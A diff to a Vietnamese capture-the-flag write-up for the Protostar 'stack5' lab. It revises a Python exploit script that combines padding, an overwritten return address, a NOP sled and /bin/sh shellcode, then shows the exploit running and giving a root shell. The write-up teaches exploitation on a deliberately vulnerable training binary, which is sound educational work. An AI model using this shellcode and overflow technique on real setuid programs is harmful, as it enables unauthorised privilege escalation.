@@ -113,15 +113,19 @@ Từ bài này chúng ta sẽ bắt đầu viết file payload exp.py
 File exp.py
 
 ``` 
-shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
-payload = "A" * 76 + "\xbc\xfc\xff\xbf" + "\x90" * 100 + shellcode
+import struct
+sc = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x31\xc9\xb0\x0b\xcd\x80\x31\xdb\xb0\x01\xcd\x80"
+pd = "A" * 76
+nop = "\x90" * 100
+retadd = struct.pack("I", 0xbffffcbc)
+payload = pd + retadd + nop + sc
 print payload
 ```
 
 Bước khai thác cuối cùng
 
 ```exp.py
-root@protostar:/opt/protostar/bin$ $(python exp.py ; cat) | ./stack5
+root@protostar:/opt/protostar/bin$ $(python exp.py; cat) | ./stack5
 id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 whoami 
